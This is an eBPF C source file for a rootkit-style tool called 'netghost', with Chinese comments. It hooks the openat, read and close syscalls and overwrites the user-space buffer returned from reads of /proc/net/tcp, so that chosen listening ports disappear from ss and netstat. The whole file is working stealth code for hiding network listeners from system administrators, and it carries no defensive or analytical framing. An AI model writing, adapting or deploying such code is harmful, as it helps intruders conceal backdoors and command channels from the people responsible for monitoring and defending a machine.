#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

char _metadata[] __attribute__((used, section(".metadata"))) =
    "{"
      "\"name\":\"netghost\","
      "\"desc\":\"网络端口隐藏：Hook /proc/net/tcp 读取，使监听端口从 ss/netstat 消失\","
      "\"requires\":[\"is_root\",\"tracefs\",\"probe_write\"],"
      "\"options\":{},"
      "\"maps\":{"
        "\"hidden_ports\":{\"key_size\":2,\"value_size\":4,\"key_type\":\"u16\",\"value_type\":\"u32\"}"
      "}"
    "}";

/*
 * 要隐藏的端口集合（主机字节序）
 * update 格式：config[0:2]=port(u16 LE), config[2:6]=1(u32 LE)
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, u16);
    __type(value, u32);
} hidden_ports SEC(".maps");

/* Per-CPU 暂存区（规避 512B 栈限制） */
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, char[2048]);
} scratch_map SEC(".maps");

/* 记录打开 /proc/net/tcp 的进程 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);
    __type(value, u32);  /* 标记位 */
} proc_tcp_open SEC(".maps");

/* 记录对应的 fd */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);
    __type(value, u32);  /* fd */
} proc_tcp_fd SEC(".maps");

/* 记录 read() 上下文 */
struct read_ctx { void *buf; u32 size; };
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);
    __type(value, struct read_ctx);
} active_read SEC(".maps");

/* /proc/net/tcp 文件名特征匹配 */
static __always_inline int is_proc_net_tcp(const char *fn) {
    /* "/proc/net/tcp" — 前14字节 */
    return fn[0]=='/' && fn[1]=='p' && fn[2]=='r' && fn[3]=='o' && fn[4]=='c' &&
           fn[5]=='/' && fn[6]=='n' && fn[7]=='e' && fn[8]=='t' &&
           fn[9]=='/' && fn[10]=='t' && fn[11]=='c' && fn[12]=='p';
}

SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx) {
    const char *fname = (const char *)ctx->args[1];
    char fn[16] = {};
    bpf_probe_read_user_str(fn, sizeof(fn), fname);
    if (is_proc_net_tcp(fn)) {
        u64 id = bpf_get_current_pid_tgid();
        u32 mark = 1;
        bpf_map_update_elem(&proc_tcp_open, &id, &mark, BPF_ANY);
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    u32 *mark = bpf_map_lookup_elem(&proc_tcp_open, &id);
    if (mark) {
        bpf_map_delete_elem(&proc_tcp_open, &id);
        if (ctx->ret >= 0) {
            u32 fd = (u32)ctx->ret;
            bpf_map_update_elem(&proc_tcp_fd, &id, &fd, BPF_ANY);
        }
    }
    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    u32 *tcp_fd = bpf_map_lookup_elem(&proc_tcp_fd, &id);
    if (tcp_fd && (u32)ctx->args[0] == *tcp_fd) {
        struct read_ctx rctx = {
            .buf  = (void *)ctx->args[1],
            .size = (u32)ctx->args[2],
        };
        bpf_map_update_elem(&active_read, &id, &rctx, BPF_ANY);
    }
    return 0;
}

/*
 * /proc/net/tcp 行格式：
 *   sl  local_address  rem_address  st  ...
 *   0:  0100007F:1538  00000000:0000 0A ...
 * local_address 中 ':' 后4位是十六进制端口
 */
static __always_inline u16 parse_port_from_line(const char *line, int len) {
    int col = 0, pos = 0;
    /* 固定上限循环，不用 #pragma unroll（让编译器自行决定） */
    for (int i = 0; i < 80; i++) {
        if (i >= len) break;
        if (line[i] == ':') {
            pos = i + 1;
            col++;
            if (col == 2) break;
        }
    }
    if (col < 2 || pos + 4 > len) return 0;

    u16 port = 0;
    #pragma unroll
    for (int i = 0; i < 4; i++) {
        char c = line[pos + i];
        u8  nib;
        if (c >= '0' && c <= '9')      nib = c - '0';
        else if (c >= 'A' && c <= 'F') nib = c - 'A' + 10;
        else if (c >= 'a' && c <= 'f') nib = c - 'a' + 10;
        else return 0;
        port = (port << 4) | nib;
    }
    return ((port & 0xFF) << 8) | (port >> 8);
}

/* 用 volatile 写入逐字节覆盖，阻止 clang 优化为 memset（eBPF 不支持） */
static __always_inline void blank_line(char *buf, int start, int end) {
    volatile char *vbuf = (volatile char *)buf;
    for (int k = 0; k < 256; k++) {
        int pos = start + k;
        if (pos >= end || pos >= 2048) break;
        vbuf[pos] = ' ';
    }
}

SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    struct read_ctx *rctx = bpf_map_lookup_elem(&active_read, &id);
    if (!rctx) return 0;

    void *user_buf = rctx->buf;
    bpf_map_delete_elem(&active_read, &id);

    int bytes_read = ctx->ret;
    if (bytes_read <= 0 || bytes_read > 2048) return 0;

    u32   zero = 0;
    char *buf  = bpf_map_lookup_elem(&scratch_map, &zero);
    if (!buf) return 0;

    long err = bpf_probe_read_user(buf, bytes_read & 2047, user_buf);
    if (err != 0) return 0;

    /* 按行扫描，最多处理 32 行（降低验证器指令计数） */
    int line_start = 0;
    for (int i = 0; i < 32; i++) {
        if (line_start >= bytes_read) break;

        /* 找行尾 — 固定最大 256 字符/行 */
        int line_end = line_start;
        for (int j = 0; j < 256; j++) {
            int p = line_start + j;
            if (p >= bytes_read || p >= 2048) break;
            if (buf[p] == '\n') { line_end = p; goto found_eol; }
            line_end = p;
        }
found_eol:;
        int line_len = line_end - line_start + 1;

        /* 跳过表头行 */
        if (i > 0 && line_len > 10) {
            u16 port = parse_port_from_line(buf + line_start, line_len);
            if (port > 0 && bpf_map_lookup_elem(&hidden_ports, &port)) {
                blank_line(buf, line_start, line_end);
                bpf_printk("NETGHOST: port %d hidden\n", port);
            }
        }

        line_start = line_end + 1;
    }

    bpf_probe_write_user(user_buf, buf, bytes_read & 2047);
    return 0;
}

SEC("tp/syscalls/sys_enter_close")
int handle_close_enter(struct trace_event_raw_sys_enter *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    u32 *tcp_fd = bpf_map_lookup_elem(&proc_tcp_fd, &id);
    if (tcp_fd && (u32)ctx->args[0] == *tcp_fd)
        bpf_map_delete_elem(&proc_tcp_fd, &id);
    return 0;
}